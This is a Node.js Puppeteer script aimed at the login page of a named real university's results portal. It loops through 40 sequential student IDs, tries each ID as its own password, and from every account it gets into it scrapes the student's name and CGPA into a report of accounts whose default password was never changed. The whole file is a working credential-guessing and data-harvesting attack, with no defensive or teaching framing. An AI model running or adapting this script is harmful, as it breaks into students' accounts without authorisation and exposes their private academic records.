const puppeteer = require("puppeteer");

const baseUrl = "https://nubtkhulna.ac.bd/ter";
const startId = 1;
const endId = 40;

(async () => {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.setDefaultNavigationTimeout(10000); // set global 10s timeout

    const unchanged = [];

    for (let i = startId; i <= endId; i++) {

        // Generate user ID in the format: ARCH1703200XX (with leading zeros)
        const userId = `ARCH1703200${String(i).padStart(2, "0")}`;
        // Log the user ID being checked
        console.log(`🔍 Trying: ${userId}`);

        try {
            // Go to login page
            await page.goto(`${baseUrl}/login`, { waitUntil: "networkidle2", timeout: 10000 });

            // Fill and submit login form
            await page.type("#username", userId);
            await page.type("#password", userId);
            await Promise.all([
                page.click("button[type=submit]"),
                page.waitForNavigation({ waitUntil: "networkidle2", timeout: 10000 }),
            ]);

            // Check if login was successful
            if (page.url().includes("panel")) {
                console.log(`✅ Login success: ${userId}`);

                // Visit overall result page
                await page.goto(`${baseUrl}/panel/overallresult`, {
                    waitUntil: "networkidle2",
                    timeout: 10000,
                });

                // Extract name and CGPA
                const data = await page.evaluate(() => {
                    let name = "Unknown";
                    let cgpa = "N/A";

                    const rows = document.querySelectorAll("table.table-bordered.table-striped tbody tr");

                    rows.forEach(row => {
                        const ths = row.querySelectorAll("th");
                        const tds = row.querySelectorAll("td");

                        for (let i = 0; i < ths.length; i++) {
                            const label = ths[i].textContent.trim();
                            if (label === "Name :") {
                                name = tds[i]?.textContent?.trim() || "Unknown";
                            }
                        }
                    });

                    const cgpaMatch = document.body.innerHTML.match(/CGPA\s*:<\/b><\/td>\s*<td[^>]*><b>([\d.]+)<\/b>/);
                    if (cgpaMatch) {
                        cgpa = cgpaMatch[1];
                    }

                    return { name, cgpa };
                });

                unchanged.push({ id: userId, ...data });

                // Sign out
                await page.goto(`${baseUrl}/login/signout`, {
                    waitUntil: "networkidle2",
                    timeout: 10000,
                });
            } else {
                console.log(`❌ Login failed: ${userId}`);
            }

        } catch (err) {
            console.error(`⏱️ Timeout or error with ${userId}: ${err.message}`);
        }
    }

    await browser.close();

    console.log("\n📋 Final Report:");
    console.table(unchanged);
})();
